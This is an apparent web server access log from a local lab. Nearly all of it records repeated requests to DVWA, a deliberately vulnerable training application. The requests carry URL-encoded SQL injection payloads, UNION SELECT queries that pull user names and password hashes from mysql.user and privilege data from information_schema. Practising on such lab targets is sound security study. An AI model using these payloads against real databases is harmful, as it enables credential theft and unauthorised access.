::1 - - [11/Nov/2019:14:24:33 +0800] "GET /phpmyadmin/themes/pmahomme/img/b_select.png HTTP/1.1" 200 593 "http://localhost/phpmyadmin/phpmyadmin.css.php?nocache=6088723570ltr&server=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:28 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+dvwa%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 48 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:05:53 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+2%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 72 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
127.0.0.1 - - [24/Oct/2019:13:06:42 +0800] "GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+all+%2Cconcat%28user%2C0x3a%2Cpassword%29%2C3%2C4%2C5%2C6+from+mysql.user%23+&Submit=Submit HTTP/1.1" 200 212 "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1%2Cconcat%28grantee%2C0x3a%2Cprivilege_type%2C0x3a%2Cis_grantable%29+from+information_schema.user_privileges%23&Submit=Submit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
